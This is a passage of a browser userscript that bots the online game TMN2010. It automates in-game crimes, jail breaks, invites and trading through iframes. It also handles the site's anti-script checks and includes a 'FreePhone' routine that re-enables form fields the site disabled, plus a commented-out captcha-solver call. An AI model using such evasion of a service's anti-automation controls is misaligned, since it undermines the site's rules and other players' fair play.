            const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
            const savedAutoOCPref = GM_getValue('TMN_AUTO_OC_PREF', '');
            const savedSpecificLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '').replaceAll(' ', '').toLowerCase().split(';');
            const savedPosition = GM_getValue('TMN_OC_POSITION', '');
            const lastNewMail = JSON.parse(GM_getValue('TMN_LAST_NEW_MAIL', '{}'));

            // return if old mail
            if (mail.id > lastNewMail.id || !lastNewMail.id) {
                GM_setValue('TMN_LAST_NEW_MAIL', JSON.stringify(mail));
                // ✅ 1. NEW MAIL NOTIFICATION
                if (mail.author !== TMN_PLAYER) {
                    Notify(`New message from ${mail.author}\n${mail.subject}`);
                    return;
                }

                // ✅ 2. TRADE NOTIFICATIONS
                if (mail.author === TMN_PLAYER &&
                    mail.subject === 'Trade Notification') {

                    const fetchedPage = await FetchPage(mail.link);
                    const mailContent = fetchedPage.find('.GridRow').text().trim().split('\n').at(-1).trim();
                    Notify(`${mail.author} - ${mail.subject}\n${mailContent}`);
                    if (savedScriptStates['Auto Arbitrage']) {
                        location.href = 'trade.aspx?autoarbitrage';
                    }
                    return;
                }

                // ✅ 3. ORGANIZED CRIME / DTM INVITES
                const isOCInvite = mail.subject === 'Organized Crime Invitation!';
                const isDTMInvite = mail.subject === 'DTM invitation';
                if (mail.author === TMN_PLAYER && (isOCInvite || isDTMInvite)) {
                    const mailPage = await FetchPage(mail.link);
                    const text = mailPage.find('.GridHeader').next().text()
                    .replace(/\s*\n\s*/g, ' ')
                    .replace(/\s+/g, ' ')
                    .trim();

                    const ocRegex = /Invitation! (.*?) has invited you to be (.*?) in .*?\((.*?)\).*? in (.*?)\./;
                    const dtmRegex = /invitation (.*?) has invited you to join his Drugs Transportation mission in (.*?)\./;

                    const match = text.match(ocRegex) || text.match(dtmRegex);
                    if (!match) return;

                    const leader = match[1]?.trim().replace('!', '').replace(' ', '');
                    const position = match[2]?.trim();
                    const ocType = match[3]?.trim();
                    const inviteLocation = match[4]?.trim() || match[2]?.trim();

                    // ✅ OC auto-accept logic
                    if (ocType && savedScriptStates.OC && savedAutoOCPref !== 'Lead OC') {
                        const leaderOK = savedAutoOCPref === 'Auto Accept Any' ||
                              savedSpecificLeaderNames.includes(leader.toLowerCase());

                        const positionOK =
                              savedPosition === 'Any' ||
                              (savedPosition !== 'TP' && position !== 'Transporter') ||
                              (savedPosition === 'TP' && position === 'Transporter');

                        if (leaderOK && positionOK && inviteLocation.includes(currentCity)) {
                            await Notify(`${mail.author} - OC Invite\n${leader} invited you as ${position} to ${ocType}`);
                            location.href = `${mail.link}&autoAccept`;
                            return;
                        } else if (!inviteLocation.includes(currentCity)){
                            Notify(`${mail.author} - ${mail.subject}\nCan't accept invite to ${leader}'s OC as it's in a different city.`);
                        }
                    }

                    // ✅ DTM auto-accept logic
                    if (savedScriptStates.DTM && inviteLocation.includes(currentCity)) {
                        await Notify(`${mail.author} - DTM Invite\n${leader} invited you to DTM`);
                        location.href = `${mail.link}&autoAccept`;
                        return;
                    } else if (!inviteLocation.includes(currentCity)){
                        Notify(`${mail.author} - DTM Invite\nCan't accept invite to ${leader}'s DTM as it's in a different city.`);
                    }
                }

                // Rest
                if (mail.author === TMN_PLAYER) {
                    if (mail.subject === 'Organized Crime Notification') {
                        Notify(`${mail.author}\nOC Complete`);
                        return;
                    } else if (mail.subject === "You've witnessed a murder!") {
                        const fetchedPage = await FetchPage(mail.link);
                        const mailContent = fetchedPage.find('.GridRow').text().trim().split('\n').at(-1).trim();
                        Notify(`${mail.author} - ${mail.subject}\n${mailContent}`);
                    }
                    else Notify(`${mail.author}\n${mail.subject}`); return;
                }
            }
        }

        function SetupMainContentFrame() {
            const consoleContent = $('#console > span')?.html();
            $('#divContent').html('').css({
                'display': 'grid',
                'grid-template-rows': '30px 1fr 30px',
                'grid-template-areas': `'log' 'content' 'heal'`
            });
            if (window.matchMedia('(orientation: landscape)').matches) {
                const $contentFrame = $('#content-frame').length && $('#content-frame') || $('<div>', { id: 'content-frame' });
                $contentFrame.css({
                    'display': 'grid',
                    'grid-template-columns': '1fr 1fr',
                    'grid-template-rows': '1fr 1fr',
                    'grid-template-areas': `'a b' 'c d'`,
                    'grid-area': 'content',
                    'width': '100%',
                    'height': '100%'
                }).html(`
                    <iframe src='/authenticated/jail.aspx' style='grid-area: a; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx' style='grid-area: b; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx?p=b' style='grid-area: c; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx?p=g' style='grid-area: d; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`);
                $('#divContent').append($contentFrame, `<iframe src='/authenticated/credits.aspx?autoheal' style='grid-area: heal; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`);
            } else {
                const $contentFrame = $('#content-frame').length && $('#content-frame') || $('<div>', { id: 'content-frame' });
                $contentFrame.css({
                    'display': 'grid',
                    'grid-template-columns': '1fr',
                    'grid-template-rows': '1fr repeat',
                    'grid-template-areas': ` 'a' 'b' 'c' 'd'`,
                    'grid-area': 'content',
                    'width': '100%',
                    'height': '100%'
                }).html(`
                    <iframe src='/authenticated/jail.aspx' style='grid-area: a; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx' style='grid-area: b; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx?p=b' style='grid-area: c; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
                    <iframe src='/authenticated/crimes.aspx?p=g' style='grid-area: d; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`);
                $('#divContent').append($contentFrame, `<iframe src='/authenticated/credits.aspx?autoheal' style='grid-area: heal; width: 100%; height: 100%; box-sizing: border-box;'></iframe>`);
            }
            $('#console > span').html(consoleContent);
        }

        function SetupContentFrame(url) {
            const consoleContent = $('#console > span')?.html();
            $('#divContent').html('').css({
                'display': 'grid',
                'grid-template-rows': '30px 1fr 30px',
                'grid-template-areas': `'log' 'content' 'heal'`
            });
            const $contentFrame = $('#content-frame').length && $('#content-frame') || $('<div>', { id: 'content-frame' });
            $contentFrame.css({
                'display': 'grid',
                'grid-template-columns': '1fr',
                'grid-template-rows': '1fr',
                'grid-template-areas': `'a'`,
                'grid-area': 'content',
                'width': '100%',
                'height': '100%'
            }).html(`
                <iframe src='/authenticated/${url}' style='grid-area: a; width: 100%; height: 100%; box-sizing: border-box;'></iframe>
            `);
            $('#divContent').append($contentFrame, `<iframe src='/authenticated/credits.aspx?autoheal' style='width: 100%; height: 100%; grid-area: heal; box-sizing: border-box;'></iframe>`);
            $('#console > span').html(consoleContent);
        }
    }

    function iFrameSetup() {
        if (window.self == window.top) {
            return;
        }

        const $divContentIn = $('#divContentIn');
        $divContentIn.parent().prevAll().hide();
        $divContentIn.parent().nextAll().hide();
        $divContentIn.parent().parent().prevAll().hide();
        $divContentIn.parent().parent().nextAll().hide();
        $divContentIn.parent().width('100%');
        $divContentIn.parent().css('left', '0');
        $divContentIn.parent().css('top', '0');
        $divContentIn.parent().css('bottom', '0');
        $divContentIn.closest('iframe').show();
    }

    async function GoNextAction() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const nextBooze = GM_getValue('TMN_NEXT_BOOZE', 0);
        const nextCrime = GM_getValue('TMN_NEXT_CRIME', 0);
        const nextGTA = GM_getValue('TMN_NEXT_GTA', 0);
        const now = Date.now();
        const campingBullets = savedScriptStates['Spawn Camp Bullets'];
        const NEXT_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity) + 120 * 60000;
        const sydneyBFSpawningShortly = NEXT_SYDNEY_SPAWN_TIME - now <= 120000;

        if (now > nextBooze && savedScriptStates.Booze && !(campingBullets && sydneyBFSpawningShortly)) location.href = 'crimes.aspx?p=b'
        else if (now > nextCrime && savedScriptStates.Crimes && !(campingBullets && sydneyBFSpawningShortly)) location.href = 'crimes.aspx'
        else if (now > nextGTA && savedScriptStates.GTA && !(campingBullets && sydneyBFSpawningShortly)) location.href = 'crimes.aspx?p=g'
        else if (!location.href.includes('jail.aspx')) location.href = 'jail.aspx';
    }

    async function JailScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
            return;
        } else if (!savedScriptStates.Jail && !isMobile()) {
            return;
        }

        if (window.self == window.top) {
            if (document.referrer?.includes('scriptCheck')) {
                setTimeout(() => { location.href = defaultPage }, 500);
                return;
            } else if (!isMobile()) {
                return;
            }
        }

        const sentenceLength = parseInt(GM_getValue('TMN_SENTENCE_LENGTH', '')) || 0;
        const lblMsg = $('#ctl00_lblMsg').text();
        if (lblMsg.includes('failed') || lblMsg.includes('You cannot load')) {
            location.href = location.href;
        } else if (lblMsg.includes('seconds')) {
            if (isMobile()) await MainSetup();
            let match = lblMsg.match(/(\d+)\s*more seconds/);
            if (match) {
                const seconds = parseInt(match[1], 10);
                if (seconds * 1000 > sentenceLength) {
                    GM_setValue('TMN_SENTENCE_LENGTH', Math.max(seconds * 1000, sentenceLength));
                    console.log('Jail sentenceLength updated: ' + GM_getValue('TMN_SENTENCE_LENGTH', ''));
                }
            }
            return;
        }

        let nextBoozeTime = parseInt(GM_getValue('TMN_NEXT_BOOZE', 0), 10);
        let nextCrimeTime = parseInt(GM_getValue('TMN_NEXT_CRIME', 0), 10);
        let nextGTATime = parseInt(GM_getValue('TMN_NEXT_GTA', 0), 10);
        const now = Date.now();

        if ((savedScriptStates.Crimes && now > nextCrimeTime) || (savedScriptStates.GTA && now > nextGTATime) || (savedScriptStates.Booze && now > nextBoozeTime)) {
            const nextTime = Math.min(Math.min(nextCrimeTime, nextGTATime), nextBoozeTime);
            const nextAction = nextTime == nextCrimeTime ? 'crimes' : nextTime == nextGTATime ? 'GTA' : 'booze';
            Log(`Pausing jail script to do ${nextAction}`);


            const checkTimers = setInterval(() => {
                nextBoozeTime = parseInt(GM_getValue('TMN_NEXT_BOOZE', 0), 10);
                nextCrimeTime = parseInt(GM_getValue('TMN_NEXT_CRIME', 0), 10);
                nextGTATime = parseInt(GM_getValue('TMN_NEXT_GTA', 0), 10);

                if (isMobile()) {
                    GoNextAction();
                } else if (now < nextCrimeTime && now < nextGTATime && now < nextBoozeTime) {
                    clearInterval(checkTimers);
                    location.href = location.href
                }
            }, 1000);
        } else {
            if (savedScriptStates.Jail) {
                const nextJetFlight = GM_getValue('TMN_NEXT_JET_FLIGHT', 0);
                if (savedScriptStates['Spawn Camp Bullets'] && nextJetFlight - now < 0) {
                    Log('Pausing jail script. Spawn camp bullets takes precedence.');
                    if (isMobile()) {
                        MainSetup();
                        setInterval(GoNextAction, 1000);
                    } else return;
                }
                else RandomBreakClick();
            } else if (isMobile()) {
                Log('Looping...');
                MainSetup();
                setInterval(GoNextAction, 1000);
            }
        }

        // Break script using the humanClick function
        function RandomBreakClick() {
            const buttons = $(`[id$='_btnBreak']:not([disabled])`);
            if (buttons.length) {
                const randomButton = buttons.eq(Math.floor(Math.random() * buttons.length))[0];
                randomButton.click();
            } else {
                location.href = location.href.replace('#', '');
            }
        }
    }

    function CrimesScript() {
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
            return;
        } else if (!savedScriptStates.Crimes) {
            return;
        }

        if (window.self == window.top) {
            /*if (scriptCheck && location.href.includes('scriptCheck')) {
                UniversalCaptchaSolve();
                return;
            } else */if (document.referrer?.includes('scriptCheck')) {
                setTimeout(() => { location.href = defaultPage }, 500);
                return;
            } else if (!isMobile()) return;
        }

        const now = Date.now();
        const campingBullets = savedScriptStates['Spawn Camp Bullets'];
        const NEXT_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity) + 120 * 60000;
        const sydneyBFSpawningShortly = NEXT_SYDNEY_SPAWN_TIME - now <= 120000;

        if (campingBullets && sydneyBFSpawningShortly && !isMobile) return;

        const lblMsg = $('#ctl00_lblMsg').text() || $('#ctl00_main_lblResult').text();
        const consoleMsg = window.top.$('#console').text();
        if (lblMsg.includes('You were successful') || lblMsg.includes('Unfortunately') || lblMsg.includes('shit')) {
            if (consoleMsg.includes('crimes')) Log('');
            if (isMobile()) GoNextAction()
            else location.href = location.href;
        } else if (lblMsg.includes('You are in jail')) {
            if (consoleMsg.includes('crimes')) Log('');
            return;
        } else if (lblMsg.includes('seconds')) {
            const seconds = lblMsg.split('Still ')[1].split(' seconds')[0];
            if (consoleMsg.includes('crimes')) Log('');
            if (isMobile()) {
                GM_setValue('TMN_NEXT_CRIME', Date.now() + seconds * 1000);
                GoNextAction();
            }
            else CrimesCountdown('Crimes');
        } else if (savedScriptStates.Crimes) {
            GM_setValue('TMN_NEXT_CRIME', Date.now() + 122000)
            $('#ctl00_main_btnCrime1')?.click();
        }
    }

    function GTAScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        if (scriptCheck) window.top.location.href = 'crimes.aspx?scriptCheck';
        else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
            return;
        } else if (!savedScriptStates.GTA) return;

        if (window.self == window.top && !isMobile()) return;

        const now = Date.now();
        const campingBullets = savedScriptStates['Spawn Camp Bullets'];
        const NEXT_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity) + 120 * 60000;
        const sydneyBFSpawningShortly = NEXT_SYDNEY_SPAWN_TIME - now <= 120000;

        if (campingBullets && sydneyBFSpawningShortly && !isMobile) return;

        const lblMsg = $('#ctl00_lblMsg').text();
        const lblResult = $('#ctl00_main_lblResult').text();
        const consoleMsg = window.top.$('#console').text();
        if (lblMsg.includes('jail')) {
            if (consoleMsg.includes('GTA')) Log('');
            return;
        } else if (lblResult.includes('successfully')) {
            if (consoleMsg.includes('GTA')) Log('');
            location.href = 'playerproperty.aspx?p=g&cleanup';
        } else if (lblResult.includes('jail') || lblResult.includes('You failed')) {
            if (consoleMsg.includes('GTA')) Log('');
            if (isMobile()) GoNextAction()
            else location.href = location.href;
        } else if ($('#ctl00_main_carslist_4')[0] && savedScriptStates.GTA) {
            GM_setValue('TMN_NEXT_GTA', Date.now() + 242000);
            $('#ctl00_main_carslist_4').click();
            $('#ctl00_main_btnStealACar').click();
        } else {
            const seconds = lblResult.split('Still ')[1].split(' seconds')[0];
            if (consoleMsg.includes('GTA')) Log('');
            if (isMobile()) {
                GM_setValue('TMN_NEXT_GTA', Date.now() + seconds * 1000);
                GoNextAction();
            }
            else CrimesCountdown('GTA');
        }
    }

    async function BoozeScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const scriptCheck = $('#ctl00_main_MyScriptTest_btnSubmit')[0];
        const sqlScriptCheck = $('#ctl00_main_pnlMessage')[0];

        if (sqlScriptCheck) {
            const message = `SQL Script Check\n${$('#ctl00_main_pnlMessage').text().replace(/\s*\n\s*/g, ' ').replace(/\s+/g, ' ').replace('Important message ', '').trim()}`;
            Notify(message);
            //window.top.location.href = 'crimes.aspx?scriptCheck';
            return;
        } else if (scriptCheck) {
            window.top.location.href = 'crimes.aspx?scriptCheck';
        } else if (OnLoginPage()) {
            window.top.location.href = 'https://www.tmn2010.net/login.aspx';
            return;
        } else if (!savedScriptStates.Booze) {
            return;
        }

        if (window.self == window.top && !isMobile()) {
            return;
        }

        const now = Date.now();
        const campingBullets = savedScriptStates['Spawn Camp Bullets'];
        const NEXT_SYDNEY_SPAWN_TIME = GM_getValue('TMN_LAST_SYDNEY_SPAWN_TIME', Infinity) + 120 * 60000;
        const sydneyBFSpawningShortly = NEXT_SYDNEY_SPAWN_TIME - now <= 120000;

        if (campingBullets && sydneyBFSpawningShortly && !isMobile) return;

        const lblMsg = $('#ctl00_lblMsg').text();
        const lblResult = $('#ctl00_main_lblResult').text();
        const consoleMsg = window.top.$('#console').text();
        // Booze result is logged as lblMsg not lblResult
        if (lblMsg.includes('You successfully')) {
            GM_setValue('TMN_NEXT_BOOZE', Date.now() + 120000);
            if (consoleMsg.includes('booze')) Log('');
            if (isMobile()) GoNextAction()
            else location.href = location.href;
        } else if (lblMsg.includes('jail')) {
            if (consoleMsg.includes('booze')) Log('');
            return;
        } else if (lblResult.includes('seconds')) {
            const seconds = lblResult.split('Still ')[1].split(' seconds')[0];
            if (consoleMsg.includes('booze')) Log('');
            if (isMobile()) {
                GM_setValue('TMN_NEXT_BOOZE', Date.now() + seconds * 1000);
                GoNextAction();
            }
            else CrimesCountdown('Booze');
            return;
        }

        const rows = $('tr').slice(1).map(function () {
            return {
                price: parseInt($(this).find('td').eq(1).text().replace(/[^0-9]/g, '')) || Infinity,
                holdings: $(this).find('td').eq(2)
            };
        });

        let lowestInput = null;
        let lowestBuyBtn = null;
        let lowestCost = Infinity;
        let didSell = false;

        rows.each((n, el) => {
            const amount = parseInt(el.holdings.text().replace(/[^0-9]/g, '')) || 0;

            if (amount > 0) {
                didSell = true;

                const sellInput = $(`[id*='tbAmtSell']`)[n];
                const sellBtn = $(`[id*='btnSell']`)[n];

                if (sellInput && sellBtn) {
                    sellInput.value = 1;
                    sellBtn.click();
                }
            }

            if (el.price < lowestCost) {
                lowestCost = el.price;
                lowestInput = $(`[id*='tbAmtBuy']`)[n];
                lowestBuyBtn = $(`[id*='btnBuy']`)[n];
            }
        });

        if (!didSell && lowestInput && lowestBuyBtn) {
            const amountToBuy = lblMsg.split('Maximum for your rank is: ')[1] || 999;
            const cash = $('#ctl00_userInfo_lblcash').text().split('$')[1].replaceAll(',', '') * 1;

            lowestInput.value = Math.floor(Math.min(cash / lowestCost, amountToBuy));
            lowestBuyBtn.click();
        }
    }

    function AcceptInvites() {
        const acceptLink = $(`a[href*='organizedcrime.aspx'][href*='accept']`).attr('href');
        LogCountdown(5000, 1000, 'Accepting invite', () => { location.href = acceptLink });
    }

    function OCScript() {
        //https://www.tmn2010.net/authenticated/organizedcrime.aspx?act=accept&ocid=3288&pos=WeaponMaster
        const TMN_PLAYER = JSON.parse(GM_getValue('TMN_PLAYER', '')).name;
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const savedAutoOCPref = GM_getValue('TMN_AUTO_OC_PREF', '');
        const savedLeadOCType = GM_getValue('TMN_LEAD_OC_TYPE', '');
        const savedLeadOCInputs = JSON.parse(GM_getValue('TMN_LEAD_OC_INPUTS', '{}'));
        const savedSpecificLeaderNames = GM_getValue('TMN_OC_LEADER_NAMES', '');
        const savedPosition = GM_getValue('TMN_OC_POSITION', '');
        const savedCarPref = GM_getValue('TMN_CAR_PREF', '');
        const startOCBtn = savedLeadOCType === 'National Bank' ? $('#ctl00_main_btnStartOCRobBank') : savedLeadOCType === 'Casino' ? $('#ctl00_main_btnStartOCRobCasino') : $('#ctl00_main_btnStartOCRobArmoury');
        const lblMsg = $('#ctl00_lblMsg');
        if (!savedScriptStates.OC) return;

        if (lblMsg.text().includes('jail')) {
            return;
        } else if (savedAutoOCPref == 'Lead OC' && startOCBtn[0]) {
            //ctl00_main_btnStartOCRobBank ctl00_main_btnStartOCRobCasino ctl00_main_btnStartOCRobArmoury
            LogCountdown(5000, 1000, 'Starting OC', () => startOCBtn.click());
        } else if (location.href.includes('store')) {
            if (location.href.includes('?p=w&r=organizedcrime&cat=weapon')) {
                LogCountdown(3000, 1000, 'Buying CheyTac', () => document.querySelector(`a[href='store.aspx?p=w&act=buy&cat=weapon&itemid=18&r=organizedcrime']`).click());
            } else if (location.href.includes('?p=w&r=organizedcrime&cat=explosive')) {
                LogCountdown(3000, 1000, 'Buying C4', () => document.querySelector(`a[href='store.aspx?p=w&act=buy&cat=explosive&itemid=9&r=organizedcrime']`).click());
            } else {
                LogCountdown(3000, 1000, 'Returning to OC', () => { location.href = 'organizedcrime.aspx' });
            }
        } else if (lblMsg.text().includes('successfully committed ')) {
            LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
        } else if (!lblMsg[0] || lblMsg.text().includes('successfully') || lblMsg.text().includes('Invitation has been sent')) {
            const $playerRow = $(`tr:contains(${TMN_PLAYER})`);
            if ($playerRow.length) GM_setValue('TMN_NEXT_OC', Infinity);
            const amReady = $playerRow.find('td').eq(3).text().includes('Ready');
            const curCity = $('#ctl00_userInfo_lblcity').text().trim();
            // const position = location.href.split('pos=')[1]; //2 Transporter 3 WeaponMaster 4 ExplosiveExpert
            const position = $playerRow.index();
            /*if (curCity != 'London') {
                LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
            } else */
            if (amReady) {
                if (savedAutoOCPref == 'Lead OC') {
                    if ($('#ctl00_main_btnCommitOC').length) {
                        LogCountdown(3000, 1000, 'Committing OC', () => $('#ctl00_main_btnCommitOC')?.click());
                        return;
                    } else {
                        LogCountdown(5000, 1000, 'Not everyone is ready. Rechecking', () => { location.href = location.href });
                        return;
                    }
                } else {
                    LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
                }
            } else if (position == '1' && savedAutoOCPref == 'Lead OC') {
                const $nameBox = $('#ctl00_main_txtinvitename');
                const $roleList = $('#ctl00_main_roleslist');
                const $inviteBtn = $('#ctl00_main_btninvite');
                if ($nameBox && $roleList && $inviteBtn) {
                    const TP = savedLeadOCInputs.transporter;
                    const WM = savedLeadOCInputs.weaponmaster;
                    const EE = savedLeadOCInputs.explosiveexpert;

                    const isOpen = sel => (($(sel)?.text() || '').toLowerCase().includes('open'));
                    const tryInvite = (name, roleValue, statusSel) => {
                        if (!name) return false;
                        if (!isOpen(statusSel)) return false;
                        $roleList.val(roleValue);
                        $nameBox.val(name);
                        LogCountdown(3000, 1000, `Inviting ${name} as ${roleValue}`, () => $inviteBtn.click());
                        return true;
                    };

                    if (tryInvite(TP,'Transporter', '#ctl00_main_lbltransporterstatus')) return;
                    if (tryInvite(WM, 'WeaponMaster', '#ctl00_main_lblweaponmasterstatus')) return;
                    if (tryInvite(EE, 'ExplosiveExpert', '#ctl00_main_lblexplosiveexpertstatus')) return;
                }
                const tpReady = $('#ctl00_main_lbltransporterstatus').text().includes('Ready');
                const wmReady = $('#ctl00_main_lblweaponmasterstatus').text().includes('Ready');
                const eeReady = $('#ctl00_main_lblexplosiveexpertstatus').text().includes('Ready');
                if (tpReady && wmReady && eeReady) {
                    $('#ctl00_main_securitydeviceslist').val(6);
                    LogCountdown(5000, 1000, 'Buying Laptop', () => $('#ctl00_main_btnBuySecurity').click());
                } else {
                    LogCountdown(5000, 1000, 'Not everyone is ready. Rechecking', () => { location.href = location.href });
                }
            } else if (position == '2') {
                let carToUse;
                const carsList = $('#ctl00_main_carslist');
                carsList.children().map((n, e) => {
                    if (!savedCarPref.includes('Worst')) {
                        if (e.textContent.includes(savedCarPref)) {
                            carToUse = e.value;
                        }
                    } else if (savedCarPref == 'Worst-to-Best') {
                        if (e.textContent.includes('Audi RS6') && !carToUse) {
                            carToUse = e.value;
                            return;
                        } else if (e.textContent.includes('Bentley Arnage') && !carToUse) {
                            carToUse = e.value;
                        }
                    } else if (savedCarPref == 'Best-to-Worst') {
                        if (e.textContent.includes('Bentley Arnage')) {
                            carToUse = e.value;
                        } else if (e.textContent.includes('Audi RS6') && !carToUse) {
                            carToUse = e.value;
                        }
                    }
                });
                if (!carToUse) return; // Leave OC
                carsList.val(carToUse);
                LogCountdown(5000, 1000, 'Choosing car', () => $('#ctl00_main_btnchoosecar').click());
            } else if (position == '3') {
                const weaponList = $('#ctl00_main_weaponslist');
                if (!weaponList.val()) {
                    LogCountdown(3000, 1000, 'Going to store', () => { location.href = 'store.aspx?p=w&r=organizedcrime&cat=weapon' });
                } else {
                    LogCountdown(5000, 1000, 'Choosing weapon', () => $('#ctl00_main_btnChooseWeapon').click());
                }
            } else if (position == '4') {
                const explosiveList = $('#ctl00_main_explosiveslist');
                if (!explosiveList.val()) {
                    LogCountdown(3000, 1000, 'Going to store', () => { location.href = 'store.aspx?p=w&r=organizedcrime&cat=explosive' });
                } else {
                    LogCountdown(5000, 1000, 'Choosing explosive', () => $('#ctl00_main_btnchooseexplosive').click());
                }
            }
        } else if (lblMsg.text().includes('Invalid invitation') || lblMsg.text().includes('You cannot do')) {
            LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
        }
    }

    function DTMScript() {
        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        if (!savedScriptStates.DTM) return;

        const lblMsg = $('#ctl00_lblMsg').text();
        //You are in the wrong location, unable to travel, or are already in a DTM.
        const btnComplete = $('#ctl00_main_btnCompleteDTM')[0] || $('#ctl00_main_btnCommitDTM')[0];
        if (lblMsg.includes('jail')) {
            return;
        } else if ((!lblMsg[0] || lblMsg.includes('successfully accepted') || lblMsg.includes(`You've started `)) && ($('#ctl00_main_pnlDTMParticipant')[0] || $('#ctl00_main_pnlDTMLeader')[0])) {
            GM_setValue('TMN_NEXT_DTM', Infinity);
            const leading = $('#ctl00_main_pnlDTMLeader')[0] || btnComplete;
            let quantity = leading && $('#ctl00_main_pnlDTMLeader')[0].textContent || $('#ctl00_main_pnlDTMParticipant')[0].textContent;
            quantity = quantity.split('carry is ')[1].split('\n')[0] * 1;
            const quantiyInput = $('#ctl00_main_tbDrugAmount')[0] && $('#ctl00_main_tbDrugAmount') || $('#ctl00_main_tbDrugLAmount');
            const buyBtn = $('#ctl00_main_btnBuyLDrugs')[0] || $('#ctl00_main_btnBuyDrugs')[0];
            if (leading) {
                if (!$('#btnAutomate')[0]) {
                    $(`<input type='button' value='Automate' id='btnAutomate'>`).insertAfter('#ctl00_main_btnInviteMember');
                    $('#btnAutomate').on('click', () => {
                        const participantInput = $('#ctl00_main_tbParticipant');
                        participantInput[0].value = participantInput[0].value == '' ? TMN_PIC : participantInput[0].value;
                        $('#ctl00_main_btnInviteMember').click();
                    });
                }
                const participantStatus = $('#ctl00_main_lblParticipantStatus').text();
                const commanderStatus = $('#ctl00_main_lbldCommanderStatus').text();
                if (participantStatus == 'Open') {
                    return;
                } else if (!participantStatus.includes('Ready')) {
                    LogCountdown(3000, 1000, 'Rechecking', () => { location.href = location.href.replace('#', '') });
                } else if (!commanderStatus.includes('Ready')) {
                    quantiyInput.val(quantity);
                    LogCountdown(3000, 1000, 'Buying drugs', () => buyBtn.click());
                } else {
                    if (btnComplete) {
                        LogCountdown(3000, 1000, 'Completing DTM', () => btnComplete.click());
                    }
                }
            } else if (buyBtn) {
                quantiyInput.val(quantity);
                LogCountdown(3000, 1000, 'Buying drugs', () => buyBtn.click());
            } else {
                location.href = defaultPage;
            }
        } else if (lblMsg.includes('successfully bought') || lblMsg.includes('Invalid request') || lblMsg.includes('wrong location') || lblMsg.includes('You successfully traveled') || lblMsg.includes('again') || btnComplete) {
            if (btnComplete) {
                LogCountdown(3000, 1000, 'Completing DTM', () => btnComplete.click());
            } else {
                LogCountdown(3000, 1000, 'Returning to home', () => { location.href = defaultPage });
            }
        } else if (lblMsg.includes('has been invited to your DTM.')) {
            LogCountdown(3000, 1000, 'Reloading', () => { location.href = location.href });
        }
    }

    function FreePhone() {
        const disabledFields = $('#ctl00_main_pnlMailSend :disabled');
        if (disabledFields.length) {
            disabledFields.prop('disabled', '');
        }
    }
    async function AutoArbitrage() {
        Log('Doing auto-arbitrage...');
        // Brief pause to wait for money to update
        if ($('#ctl00_lblMsg').text().includes('jail')) return;
        await new Promise(resolve => setTimeout(resolve, 1000));

        const savedScriptStates = JSON.parse(GM_getValue('TMN_SCRIPT_STATES', '{}'));
        const savedUsername = JSON.parse(GM_getValue('TMN_PLAYER', '{}'))?.name || '';
        if (!savedScriptStates['Auto Arbitrage']) return;

        const MAX_ACTIVE_OFFERS = 5;
        const activeCreditOffers = $('#ctl00_main_pnlCreditOffers table.smallerfonttable tr').filter(function () {
            return $(this).find('td').first().text().trim().includes(savedUsername);
        }).length;
        const activeBulletOffers = $('#ctl00_main_pnlBulletOffers table.smallerfonttable tr').filter(function () {
            return $(this).find('td').first().text().trim().includes(savedUsername);
        }).length;
        const activeMoneyOffers = $('#ctl00_main_pnlMoneyOffers table.smallerfonttable tr').filter(function () {
            return $(this).find('td').first().text().trim().includes(savedUsername);
        }).length;
        const totalActiveOffers = activeCreditOffers + activeBulletOffers + activeMoneyOffers;
        const savedArbitrageInputs = JSON.parse(GM_getValue('TMN_ARBITRAGE_INPUTS', '{}'));
        const KEEP_ON_HAND = savedArbitrageInputs['MoneyOnHand'];
        const buyCreditsPrice = savedArbitrageInputs['BuyCreditsPrice'];
        const buyCreditsQuantity = savedArbitrageInputs['BuyCreditsQuantity'];
        const sellCreditsPrice = savedArbitrageInputs['SellCreditsPrice'];
        const sellCreditsQuantity = savedArbitrageInputs['SellCreditsQuantity'];
